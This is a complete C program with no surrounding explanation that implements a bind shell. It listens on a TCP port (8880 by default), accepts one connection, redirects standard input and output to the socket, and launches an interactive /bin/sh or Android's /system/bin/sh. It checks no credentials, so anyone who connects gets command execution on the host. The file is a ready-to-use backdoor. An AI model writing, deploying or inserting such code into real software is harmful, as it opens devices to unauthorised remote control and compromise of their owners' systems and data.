#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


#define DEBUG 1
//#undef DEBUG
#define CONNCLIENTS 3

int main (int argc, char **argv)
{
	int scktd = -1;
	int scktd_client = -1;
	int i = -1;
	struct sockaddr_in server;
	struct sockaddr_in client;

	scktd = socket(AF_INET,SOCK_STREAM,0);
	if (scktd == -1){
		return -1;
	}else{
		#ifdef DEBUG
		printf("Socketd created\n");
		#endif
	}

	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	if(argc==2) {
		#ifdef DEBUG
		printf("Port: %s\n",argv[1]);
		#endif
		server.sin_port = htons(atoi(argv[1]));
	} else {
		#ifdef DEBUG
		printf("Port: %s\n","8880");
		#endif
		server.sin_port = htons(8880);
	}
	if(bind(scktd,(struct sockaddr *)&server,sizeof(server)) < 0){
		#ifdef DEBUG
		printf("Bind err\n");
		#endif
		return -2;
	}

	if(listen(scktd,CONNCLIENTS)==-1){
		#ifdef DEBUG
		printf("Listen err\n");
		#endif
	} else {
		#ifdef DEBUG
		printf("Listen ok\n");
		#endif
	}
	i = sizeof(struct sockaddr_in);
	scktd_client = accept(scktd,(struct sockaddr *)&client,(socklen_t*)&i);
	if (scktd_client < 0){
		#ifdef DEBUG
		printf("Client accept err\n");
		#endif
		return -3;
	}

	dup2(scktd_client,0); // STDIN
	dup2(scktd_client,1); // STDOUT
	dup2(scktd_client,2); // STDERR

	if( access( "/bin/sh", F_OK ) == 0 ) {
		execl("/bin/sh","sh","-i",NULL,NULL);
	}
	if( access( "/system/bin/sh", F_OK ) == 0 ) {
		execl("/system/bin/sh","sh","-i",NULL,NULL);
	}
	
	return 0;
}
